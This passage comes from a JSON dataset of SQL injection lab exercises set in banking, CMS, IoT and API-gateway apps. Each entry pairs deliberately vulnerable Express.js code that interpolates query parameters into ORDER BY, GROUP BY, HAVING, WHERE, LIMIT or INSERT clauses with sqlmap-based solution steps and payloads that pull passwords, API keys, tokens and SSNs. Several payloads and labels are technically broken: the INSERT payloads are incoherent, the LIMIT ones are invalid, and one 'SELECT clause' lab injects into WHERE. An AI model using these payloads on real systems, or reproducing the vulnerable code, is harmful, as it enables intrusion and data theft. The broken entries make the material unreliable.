      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of user passwords or other sensitive information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount DESC, (SELECT password FROM users LIMIT 1)--",
      "date ASC, (SELECT email FROM users LIMIT 1)--",
      "id, (SELECT credit_card_number FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS's analytics feature groups page views by user-defined criteria. The application incorporates user input directly into the GROUP BY clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to extract administrative user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the analytics endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'username, (SELECT password FROM admins)--'.",
      "Analyze the response for any unusual behavior or data leakage.",
      "Employ sqlmap with appropriate flags to automate the exploitation.",
      "Verify the extraction of administrative user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM page_views GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "username, (SELECT password FROM admins)--",
      "page, (SELECT email FROM users)--",
      "referrer, (SELECT session_token FROM sessions)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard's device status report feature allows filtering based on user-defined conditions. The application incorporates user input directly into the HAVING clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to retrieve sensitive device information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send requests to the device status report endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'battery_level > 50 HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--'.",
      "Observe the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of device IDs and secret keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-status', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT device_id, status FROM devices WHERE ${filter} GROUP BY device_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "battery_level > 50 HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--",
      "signal_strength < 30 HAVING 1=1 UNION SELECT device_id, access_token FROM devices--",
      "temperature > 70 HAVING 1=1 UNION SELECT device_id, firmware_version FROM devices--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API gateway's request logging feature allows sorting logs based on user-defined fields. The application directly incorporates user input into the ORDER BY clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to extract sensitive API keys.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the logs endpoint.",
      "Modify the 'sort' parameter to include SQL injection payloads, such as 'timestamp DESC, (SELECT api_key FROM clients LIMIT 1)--'.",
      "Analyze the response for any anomalies or data leakage.",
      "Employ sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of API keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/logs', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM request_logs ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "timestamp DESC, (SELECT api_key FROM clients LIMIT 1)--",
      "endpoint ASC, (SELECT secret FROM tokens LIMIT 1)--",
      "status_code, (SELECT password FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal's account summary feature groups transactions by user-defined criteria. The application incorporates user input directly into the GROUP BY clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to retrieve sensitive financial data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the account summary endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'account_type, (SELECT balance FROM accounts)--'.",
      "Observe the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of account balances."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-summary', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM transactions GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "account_type, (SELECT balance FROM accounts)--",
      "transaction_type, (SELECT credit_limit FROM cards)--",
      "currency, (SELECT interest_rate FROM loans)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in HAVING Clause",
    "Lab Description": "The CMS's content analytics feature allows filtering based on user-defined conditions. The application incorporates user input directly into the HAVING clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to extract sensitive user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests to the content analytics endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'views > 100 HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Analyze the response for any anomalies or data leakage.",
      "Employ sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of usernames and passwords."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/content-analytics', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT content_id, views FROM content WHERE ${filter} GROUP BY content_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "views > 100 HAVING 1=1 UNION SELECT username, password FROM users--",
      "likes < 50 HAVING 1=1 UNION SELECT email, session_token FROM users--",
      "comments > 10 HAVING 1=1 UNION SELECT name, role FROM admins--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s loan approval feature allows users to filter loans based on specific criteria. The application integrates user input into the HAVING clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to extract sensitive loan applicant data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the loan approval filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'amount > 10000 HAVING 1=1 UNION SELECT loan_id, customer_name FROM loan_applications--'.",
      "Check the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and retrieve sensitive loan application details.",
      "Verify the successful extraction of loan applicant data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/loan-approval', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM loans WHERE ${filter} GROUP BY loan_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount > 10000 HAVING 1=1 UNION SELECT loan_id, customer_name FROM loan_applications--",
      "amount < 50000 HAVING 1=1 UNION SELECT loan_id, social_security FROM loan_applications--",
      "status = 'approved' HAVING 1=1 UNION SELECT loan_id, account_balance FROM loan_applications--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in ORDER BY Clause",
    "Lab Description": "The CMS\u00e2\u20ac\u2122s article search feature allows users to sort articles based on various criteria. The application includes unsanitized user input directly into the ORDER BY clause, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to extract sensitive article content and user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the article search endpoint.",
      "Inject SQL payloads into the 'sort' parameter, such as 'date DESC, (SELECT password FROM users LIMIT 1)--'.",
      "Analyze the response for any unusual behavior or data leakage.",
      "Utilize sqlmap to automate the exploitation and retrieve sensitive user information.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/articles', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM articles ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "date DESC, (SELECT password FROM users LIMIT 1)--",
      "author ASC, (SELECT email FROM users LIMIT 1)--",
      "title, (SELECT role FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard\u00e2\u20ac\u2122s device statistics feature groups devices based on various user-defined criteria. The application improperly integrates user input into the GROUP BY clause, allowing for SQL injection. To solve: Exploit the GROUP BY clause to retrieve sensitive device information and credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device statistics endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'device_type, (SELECT device_id FROM devices LIMIT 1)--'.",
      "Monitor the response for any anomalies or leakage of sensitive data.",
      "Use sqlmap to automate the exploitation and retrieve device-related secrets.",
      "Confirm the retrieval of device IDs and other sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-stats', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM devices GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "device_type, (SELECT device_id FROM devices LIMIT 1)--",
      "manufacturer, (SELECT secret_key FROM devices LIMIT 1)--",
      "location, (SELECT api_token FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "The API gateway exposes a feature that allows users to filter requests based on various criteria. The application improperly integrates user input into the HAVING clause, which allows SQL injection. To solve: Exploit the HAVING clause to retrieve sensitive API credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests to the API logs endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status = 'success' HAVING 1=1 UNION SELECT api_key, client_id FROM api_clients--'.",
      "Examine the response for any signs of data leakage.",
      "Use sqlmap to automate the exploitation and retrieve sensitive API client data.",
      "Verify the successful extraction of API keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-logs', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM api_logs WHERE ${filter} GROUP BY client_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status = 'success' HAVING 1=1 UNION SELECT api_key, client_id FROM api_clients--",
      "endpoint = '/payment' HAVING 1=1 UNION SELECT api_key, client_secret FROM api_clients--",
      "method = 'POST' HAVING 1=1 UNION SELECT api_key, secret_key FROM api_clients--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s account search feature allows users to search for accounts based on user-defined parameters. The application integrates user input directly into the HAVING clause without sanitization, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to retrieve sensitive account data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the account search endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'balance > 1000 HAVING 1=1 UNION SELECT account_number, account_holder FROM accounts--'.",
      "Inspect the response for any anomalies or leakage of account data.",
      "Utilize sqlmap to automate the exploitation and retrieve sensitive account details.",
      "Confirm the successful extraction of account numbers and account holders."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-search', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT account_number, balance FROM accounts WHERE ${filter} GROUP BY account_number HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "balance > 1000 HAVING 1=1 UNION SELECT account_number, account_holder FROM accounts--",
      "balance < 50000 HAVING 1=1 UNION SELECT account_number, routing_number FROM accounts--",
      "status = 'active' HAVING 1=1 UNION SELECT account_number, credit_score FROM accounts--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in ORDER BY Clause",
    "Lab Description": "The CMS\u00e2\u20ac\u2122s user content filter feature allows users to sort content based on various criteria. The application integrates user input directly into the ORDER BY clause, which leads to SQL injection. To solve: Exploit the ORDER BY clause to extract sensitive user content and administrative data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the content filter endpoint.",
      "Inject SQL payloads into the 'sort' parameter, such as 'created_at DESC, (SELECT email FROM users LIMIT 1)--'.",
      "Analyze the application\u00e2\u20ac\u2122s response for any anomalies or data leakage.",
      "Use sqlmap to automate the exploitation and retrieve sensitive user details.",
      "Verify the successful extraction of sensitive user information, including email addresses."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/content', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM content ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "created_at DESC, (SELECT email FROM users LIMIT 1)--",
      "title ASC, (SELECT password FROM users LIMIT 1)--",
      "author, (SELECT role FROM admins LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard allows filtering devices based on user-defined criteria and uses a HAVING clause to refine device data. Improper input handling allows SQL injection in the HAVING clause. To solve: Exploit the HAVING clause to retrieve device secret credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the device filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status = 'online' HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--'.",
      "Observe the response for any anomalies or leakage of sensitive data.",
      "Use sqlmap to automate the exploitation and retrieve device credentials.",
      "Confirm the successful extraction of device IDs and secret keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT device_id, status FROM devices WHERE ${filter} GROUP BY device_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status = 'online' HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--",
      "device_type = 'sensor' HAVING 1=1 UNION SELECT device_id, access_token FROM devices"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s transaction search feature improperly includes user input into the WHERE clause, allowing for SQL injection. To solve: Inject SQL into the WHERE clause to retrieve sensitive transaction details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction search endpoint.",
      "Inject SQL payloads into the 'transaction_id' parameter, such as '123 OR 1=1--'.",
      "Examine the response for any unexpected data or errors.",
      "Utilize sqlmap to automate the exploitation and extract transaction details.",
      "Verify the successful extraction of transaction information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-search', (req, res) => {\n  const transactionId = req.query.transaction_id;\n  const query = `SELECT * FROM transactions WHERE transaction_id = ${transactionId}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "123 OR 1=1--",
      "456 OR 1=1--",
      "789 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in HAVING Clause",
    "Lab Description": "The CMS\u00e2\u20ac\u2122s user filter functionality is vulnerable to SQL injection because it improperly integrates user input into the HAVING clause. To solve: Exploit the HAVING clause to retrieve sensitive user information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the user filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'role = 'admin' HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any anomalies or leaked data.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/user-filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM users WHERE ${filter} GROUP BY username HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "role = 'admin' HAVING 1=1 UNION SELECT username, password FROM users--",
      "status = 'active' HAVING 1=1 UNION SELECT username, email FROM users--",
      "type = 'editor' HAVING 1=1 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows users to sort devices by various attributes. The application includes unsanitized user input directly into the ORDER BY clause, allowing for SQL injection. To solve: Exploit the ORDER BY clause to retrieve sensitive device information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device sorting endpoint.",
      "Inject SQL payloads into the 'order' parameter, such as 'device_type ASC, (SELECT serial_number FROM devices LIMIT 1)--'.",
      "Examine the response for any anomalies or sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device credentials.",
      "Verify the successful extraction of sensitive device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-sort', (req, res) => {\n  const order = req.query.order;\n  const query = `SELECT * FROM devices ORDER BY ${order}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "device_type ASC, (SELECT serial_number FROM devices LIMIT 1)--",
      "location DESC, (SELECT ip_address FROM devices LIMIT 1)--",
      "status ASC, (SELECT device_key FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in GROUP BY Clause",
    "Lab Description": "The API gateway allows sorting and grouping of data from various endpoints. Improper handling of user input in the GROUP BY clause creates a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to extract sensitive API credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests to the API data endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'device_id GROUP BY device_type, (SELECT api_key FROM api_clients LIMIT 1)--'.",
      "Observe the response for any data anomalies or leaks.",
      "Use sqlmap to automate the exploitation and retrieve API credentials.",
      "Verify the successful extraction of sensitive API client information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-data', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT * FROM data GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "device_id GROUP BY device_type, (SELECT api_key FROM api_clients LIMIT 1)--",
      "timestamp GROUP BY device_type, (SELECT api_secret FROM api_clients LIMIT 1)--",
      "status GROUP BY device_type, (SELECT api_token FROM api_clients LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in SELECT Clause",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s account balance feature improperly integrates user input into the SELECT clause, allowing for SQL injection. To solve: Exploit the SELECT clause to retrieve sensitive customer information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the account balance endpoint.",
      "Inject SQL payloads into the 'account_id' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Check for any data anomalies or unexpected responses.",
      "Use sqlmap to automate the exploitation and retrieve sensitive user data.",
      "Confirm the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const accountId = req.query.account_id;\n  const query = `SELECT balance FROM accounts WHERE account_id = ${accountId}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT email, role FROM users--",
      "3 UNION SELECT username, secret FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in WHERE Clause",
    "Lab Description": "The CMS\u00e2\u20ac\u2122s article search feature includes user input directly into the WHERE clause, making it vulnerable to SQL injection. To solve: Inject SQL into the WHERE clause to retrieve sensitive article and user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the article search endpoint.",
      "Inject SQL payloads into the 'search' parameter, such as 'author = 'admin' AND 1=1 UNION SELECT username, password FROM users--'.",
      "Analyze the response for any data anomalies or leaked information.",
      "Use sqlmap to automate the exploitation and retrieve sensitive user details.",
      "Verify the successful extraction of sensitive user data, including passwords."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/article-search', (req, res) => {\n  const search = req.query.search;\n  const query = `SELECT * FROM articles WHERE author = ${search}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "author = 'admin' AND 1=1 UNION SELECT username, password FROM users--",
      "status = 'published' AND 1=1 UNION SELECT username, email FROM users--",
      "type = 'editor' AND 1=1 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard\u00e2\u20ac\u2122s device filter feature improperly uses user input in the HAVING clause, allowing SQL injection. To solve: Exploit the HAVING clause to retrieve sensitive device credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status = 'active' HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--'.",
      "Analyze the response for any anomalies or sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device credentials.",
      "Verify the successful extraction of sensitive device information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM devices WHERE ${filter} GROUP BY device_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status = 'active' HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--",
      "device_type = 'sensor' HAVING 1=1 UNION SELECT device_id, api_token FROM devices--",
      "location = 'office' HAVING 1=1 UNION SELECT device_id, access_key FROM devices--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in WHERE Clause",
    "Lab Description": "The API gateway\u00e2\u20ac\u2122s query endpoint improperly integrates user input into the WHERE clause, creating an SQL injection vulnerability. To solve: Exploit the WHERE clause to retrieve sensitive API credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send requests to the API query endpoint.",
      "Inject SQL payloads into the 'query' parameter, such as 'status = 'active' AND 1=1 UNION SELECT api_key, api_secret FROM api_clients--'.",
      "Observe the response for any leaked data or errors.",
      "Use sqlmap to automate the exploitation and retrieve sensitive API credentials.",
      "Verify the successful extraction of sensitive API client data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-query', (req, res) => {\n  const query = req.query.query;\n  const sqlQuery = `SELECT * FROM clients WHERE ${query}`;\n  db.query(sqlQuery, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status = 'active' AND 1=1 UNION SELECT api_key, api_secret FROM api_clients--",
      "type = 'premium' AND 1=1 UNION SELECT api_token, api_secret FROM api_clients--",
      "plan = 'basic' AND 1=1 UNION SELECT api_key, api_token FROM api_clients--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s transaction sorting feature includes user input in the ORDER BY clause, making it vulnerable to SQL injection. To solve: Exploit the ORDER BY clause to retrieve sensitive transaction data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction sorting endpoint.",
      "Inject SQL payloads into the 'sort' parameter, such as 'amount DESC, (SELECT username FROM users LIMIT 1)--'.",
      "Check for any anomalies or sensitive data leakage in the response.",
      "Use sqlmap to automate the exploitation and retrieve transaction or user data.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount DESC, (SELECT username FROM users LIMIT 1)--",
      "timestamp ASC, (SELECT email FROM users LIMIT 1)--",
      "status DESC, (SELECT role FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in JOIN Clause",
    "Lab Description": "The CMS application joins the articles table with the authors table, but it does not sanitize user input. To solve: Exploit the JOIN clause to extract sensitive data from the authors table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article search endpoint.",
      "Inject SQL payloads into the 'author' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any unexpected output or leaks.",
      "Use sqlmap to automate the exploitation and extract user credentials.",
      "Verify the successful extraction of user credentials from the authors table."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/article-search', (req, res) => {\n  const author = req.query.author;\n  const query = `SELECT * FROM articles JOIN authors ON articles.author_id = authors.id WHERE authors.name = ${author}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT email, password FROM users--",
      "3 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s transaction summary page uses user input in the GROUP BY clause for sorting. To solve: Exploit the GROUP BY clause to retrieve sensitive account information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction summary endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'status GROUP BY transaction_type HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Analyze the response for any unexpected data or errors.",
      "Use sqlmap to automate the exploitation and retrieve sensitive user information.",
      "Verify the successful extraction of account data from the users table."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-summary', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT * FROM transactions GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status GROUP BY transaction_type HAVING 1=1 UNION SELECT username, password FROM users--",
      "amount GROUP BY transaction_type HAVING 1=1 UNION SELECT email, password FROM users--",
      "type GROUP BY transaction_type HAVING 1=1 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in LIMIT Clause",
    "Lab Description": "The IoT dashboard improperly includes user input in the LIMIT clause, allowing for SQL injection. To solve: Exploit the LIMIT clause to extract sensitive device data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device listing endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as '1, (SELECT serial_number FROM devices LIMIT 1)--'.",
      "Examine the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device information.",
      "Verify the successful extraction of sensitive device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM devices LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1, (SELECT serial_number FROM devices LIMIT 1)--",
      "2, (SELECT device_id FROM devices LIMIT 1)--",
      "3, (SELECT ip_address FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS application allows administrators to add new users through a form, but it does not properly sanitize the input in the INSERT query. To solve: Inject SQL into the INSERT clause to create a new admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the user creation endpoint.",
      "Inject SQL payloads into the 'username' and 'email' parameters, such as 'admin', 'password', 'admin@admin.com', 'INSERT INTO users (username, password, email) VALUES ('admin', 'password', 'admin@admin.com')--'.",
      "Examine the response for any anomalies or success indicators.",
      "Use sqlmap to automate the exploitation and create a new user.",
      "Verify the successful creation of the new admin user."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/create-user', (req, res) => {\n  const { username, password, email } = req.body;\n  const query = `INSERT INTO users (username, password, email) VALUES ('${username}', '${password}', '${email}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'User created' });\n  });\n});",
    "payloads": [
      "'admin', 'password', 'admin@admin.com', 'INSERT INTO users (username, password, email) VALUES ('admin', 'password', 'admin@admin.com')--",
      "'hacker', '12345', 'hacker@evil.com', 'INSERT INTO users (username, password, email) VALUES ('hacker', '12345', 'hacker@evil.com')--",
      "'attacker', 'pass123', 'attacker@evil.com', 'INSERT INTO users (username, password, email) VALUES ('attacker', 'pass123', 'attacker@evil.com')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in LIMIT Clause",
    "Lab Description": "The API Gateway improperly uses user input in the LIMIT clause for paginating API results. To solve: Exploit the LIMIT clause to retrieve sensitive API client data.",
    "Difficulty Level": "Medium",
